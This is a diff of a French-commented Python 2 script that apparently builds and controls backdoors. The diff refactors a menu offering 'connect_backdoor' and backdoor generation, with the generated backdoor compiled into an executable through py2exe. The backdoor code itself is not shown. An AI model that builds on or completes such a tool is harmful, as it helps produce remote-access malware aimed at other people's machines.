@@ -333,8 +333,7 @@ def generator():
 
 """ Sous-Program """
 def subprogram():
-	code = 0
-	
+	global code
 	if(code == 1):
 		print("\n[INFO] - Launching subprogram\n")
 		IP = raw_input("> IP: ")
@@ -373,45 +372,24 @@ def subprogram():
 """ Mode d'éxecution du program """
 def program():
 	pic()
-	b = 1
-	
-	while b == 1:
+	while(1):
 		process = int(input("Choisir le processus {\n\t|1. normal \n\t|2. make_tree \n\t|3. scan_tree \n\t|4. connect_backdoor \n\t|5. generator \n\t|0. exit\n}:\n>>> "))
 		
-		""" Lancement normal """
-		if(process == 1):
-			normal()
-		
-		""" Lancement générateur d'arborescence """
-		if(process == 2):
-			make_tree()
-		
-		""" Lancement du scan """
-		if(process == 3):
-			scan_tree()
-		
-		""" Connexion au backdoor """
-		if(process == 4):
-			connect_backdoor()
-		
-		""" Génération d'un backdoor """
-		if(process == 5):
+		if(process == 1): normal() # Lancement normal
+		if(process == 2): make_tree() # Lancement générateur d'arborescence
+		if(process == 3): scan_tree() # Lancement du scan
+		if(process == 4): connect_backdoor() # Connexion au backdoor
+		if(process == 5): # Génération d'un backdoor
 			generator()
-			os.system('setup.py py2exe')
+			compilation = os.system('setup.py py2exe')
 			print("\n[INFO] - Compilation Terminer")
 		
-		""" Pour quitter """
-		if(process == 0):
+		if(process == 0): # Pour quitter
 			print("Qitting...\n")
-			b = 0
+			exit(1)
 		
-		if(process == 6):
-			subprogram()
-		
-		if(process > 6):
-			print("\n[ERROR] - Process not installed\n")
-	
-	exit(1)
+		if(process == 6): subprogram()
+		if(process > 6): print("\n[ERROR] - Process not installed\n")
 
 """ Lancement """
 program()
